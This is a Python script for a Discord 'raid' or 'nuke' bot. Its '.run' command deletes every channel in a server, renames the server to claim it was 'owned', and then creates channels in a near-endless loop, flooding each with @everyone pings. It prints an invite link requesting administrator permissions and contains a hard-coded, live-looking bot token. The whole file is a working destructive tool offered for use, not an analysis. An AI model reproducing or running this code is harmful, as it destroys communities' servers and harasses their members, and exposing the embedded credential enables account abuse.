import discord
from discord.ext import commands
import asyncio

TOKEN = 'MTQ3NzY5MjM4MDg5NDQ2NjEzOQ.Gp-8OJ.14MT00bR_rZwsGks6YjxPBvrob8mqbsWZTzTD0' 
intents = discord.Intents.default()
intents.message_content = True 
bot = commands.Bot(command_prefix='.', intents=intents)

async def spam(channel, message):
    while True:
        try:
            await channel.send(message)
            await asyncio.sleep(0.1)
        except:
            break

@bot.event
async def on_ready():
    print(f'logged in as {bot.user.name} (id: {bot.user.id})')
    print('bot logs')
    print('invite link: https://discord.com/oauth2/authorize?client_id=1477692380894466139&permissions=8&integration_type=0&scope=bot')
    print('-----------------')

@bot.command()
async def run(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"couldnt delete {channel.name}, error {e}")
    try:
        await ctx.guild.edit(name="-- OWNED BY SLYNX --")
    except Exception as e:
        print(f"couldnt change name: {e}")
            
    for i in range(99999999999999999):
        try:
            ch1 = await ctx.guild.create_text_channel('-- RAIDED BY SLYNX --')
            bot.loop.create_task(spam(ch1, '# @everyone @here uh oh someone got raided by slynx'))
            ch2 = await ctx.guild.create_text_channel('-- CLOWNED BY SLYNX --')
            bot.loop.create_task(spam(ch2, '# @everyone @here uh oh someone got clowned by slynx'))
            ch3 = await ctx.guild.create_text_channel('-- DESTROYED BY SLYNX --')
            bot.loop.create_task(spam(ch3, '# @everyone @here uh oh someone got destroyed by slynx'))
            ch4 = await ctx.guild.create_text_channel('-- HUMILIATED BY SLYNX --')
            bot.loop.create_task(spam(ch4, '# @everyone @here uh oh someone got humiliated by slynx'))
        except Exception as e:
            print(f"error with creating channels: {e}")
            break

bot.run(TOKEN)
